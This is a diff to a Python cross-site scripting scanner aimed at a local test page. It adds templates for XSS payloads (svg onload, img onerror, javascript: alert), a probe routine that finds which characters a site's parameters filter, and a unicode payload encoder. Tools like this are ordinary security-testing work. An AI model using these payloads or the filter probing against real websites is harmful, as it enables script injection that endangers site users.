@@ -3,13 +3,43 @@ from bs4 import BeautifulSoup as bs
 from urllib.parse import urlsplit
 from urllib.parse import urljoin
 import requests
+import binascii
 import random
 import string
 import re
 import os
 import sys
 
-url = 'http://127.0.0.1:8000/xss-example/';
+url = 'http://127.0.0.1/xss-example/';
+
+common_payload = '''
+(">|"/>|</[TAGNAME]>)<embed(/)[RND]src=[EVAL]>
+(">|"/>|</[TAGNAME]>)<svg(/)[RND]onload=[EVAL]>
+(">|"/>|</[TAGNAME]>)<style(/)[RND]onload=[EVAL]>
+(">|"/>|</[TAGNAME]>)<marquee(/)[RND]onstart=[EVAL]>
+(">|"/>|</[TAGNAME]>)<isindex(/)[RND](formaction)=[EVAL]>
+(">|"/>|</[TAGNAME]>)<object(/)[RND](data|onerror)=[EVAL]>
+(">|"/>|</[TAGNAME]>)<iframe(/)[RND]src=(EVAL|[RND]onload=[EVAL])>
+(">|"/>|</[TAGNAME]>)<(video|audio)(/)[RND]src=[RND]onerror=[EVAL]>
+(">|"/>|</[TAGNAME]>)<a(/)[RND](href|onmousemove|onmouseover|onclick)=[EVAL]>
+(">|"/>|</[TAGNAME]>)<body(/)[RND](onload|background|onerror|onclick)=[EVAL]>
+(">|"/>|</[TAGNAME]>)<var(/)[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]
+(">|"/>|</[TAGNAME]>)<script[RND]>[RND](src|onerror)=[EVAL]>[EVAL]</script[RND]>
+(">|"/>|</[TAGNAME]>)<(div|span|a|[LETTER])(/)[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]
+(">|"/>|</[TAGNAME]>)<(img|image)(/)[RND]src=(EVAL|[RND])(onerror|onmouseover|onmousemove|onclick)=[EVAL]>
+(">|"/>|</[TAGNAME]>)<(select|textarea|input|keygen)(/)[RND](autofocus)(onfocus|onmousemove|onmouseover|onclick)=[EVAL]>
+'''
+event_payload = '''
+"(/)(onload|onstart|onerror|onmousemove|onmouseover|onclick|background|src|onfocus|formaction|data|)=[EVAL](//)
+'''
+js_payload = '''
+(javascript:)alert`0`
+(javascript:)prompt`0`
+(javascript:)confirm`0`
+(javascript:)alert(0)
+(javascript:)prompt(0)
+(javascript:)confirm(0)
+'''
 
 def get_dynamic_links_url(murl):
     '''
@@ -154,11 +184,53 @@ def get_xss_filter(links):
     '''
     find filtered keyword
     '''
-    quotes = ['<','>','/','\'','\"','`','(',')',';','=','&','#','\\','{','}','+','-','%','*',':']
-    program = ['alert','prompt','confirm''javascript','data']
-    tagname = ['script','img','svg','video','audio','canvas','iframe','embed','a','object','x','marquee','form','input','menu','keygen','select','xss','isindex','meta','bgsound']
-    onevent = ['onerror','onmouseover','onload','autofocus','onfocus','data','href','onclick','oncopy','oncut','ondrag','oninput','onkeydown','onkeypress','onkeyup','onmousemove','onmouseup','onmousedown','onmouseout','onparse','onpageshow','onscroll','onresize','onhelp','onstart','onfinish','onloadstart','onblur','onsubmit','onchange','onshow','style','action','content','src']
-    '''Use if ... else to get instead of BRUTE'''
+    xlink = links
+    symbols = '<>/\\\'"`();=&#\{\}+-%*:'
+    for murl,mitem in links.items():
+        for method,item in mitem.items():
+            for pos,params in item.items():
+                xlink[murl][method][pos] = dict()
+                for p in params:
+                    data = dict()
+                    allowed = list()
+                    for pp in params:
+                        if pp != p:
+                            data[pp] = ''.join(random.sample(string.ascii_letters,8))
+                    for s in symbols:
+                        rnd = ''.join(random.sample(string.ascii_letters,8))
+                        data[p] = rnd + s + rnd
+                        if method == 'get':
+                            response = requests.get(murl,params=data)
+                        else:
+                            response = requests.post(murl,data=data)
+                        keyword = re.findall(r'(?<={0})(.*)?(?={1})'.format(rnd,rnd),response.text)
+                        if keyword:
+                            for k in keyword:
+                                if k == s:
+                                    allowed.append(s)
+                    xlink[murl][method][pos][p] = [a for a in symbols if a not in allowed] 
+                    if len(allowed) == len(symbols):
+                        print(p,'allowed all symbols')
+                    else:
+                        print(p,','.join([a for a in symbols if a not in allowed]),'filtered')
+    return xlink
+
+def encode_xss_payload(payload,enctype):
+    '''
+    Encode xss payload
+    '''
+    if enctype == 'unicode':
+        epayload = ''
+        for p in payload:
+            epayload += '\\u00' + binascii.hexlify(p.encode('unicode-escape')).decode()
+        return epayload
+
+def automatic_gen_payload(result):
+    '''
+    Generate payload according to the result
+    '''
+    pass
+
 
 def inject_xss_payload(links):
     '''
@@ -187,9 +259,9 @@ def inject_xss_payload(links):
                             print(k,'detect xss:',payload)
 
 
-ulinks = get_dynamic_links_url(url)
-flinks = get_dynamic_links_form(url)
-plinks1 = get_output_position(ulinks)
-plinks2 = get_output_position(flinks)
-get_xss_filter(plinks1)
-inject_xss_payload(plinks1)
+#ulinks = get_dynamic_links_url(url)
+#flinks = get_dynamic_links_form(url)
+#plinks1 = get_output_position(ulinks)
+#plinks2 = get_output_position(flinks)
+#xlinks1 = get_xss_filter(plinks1)
+print(encode_xss_payload('alert(1)','unicode'))
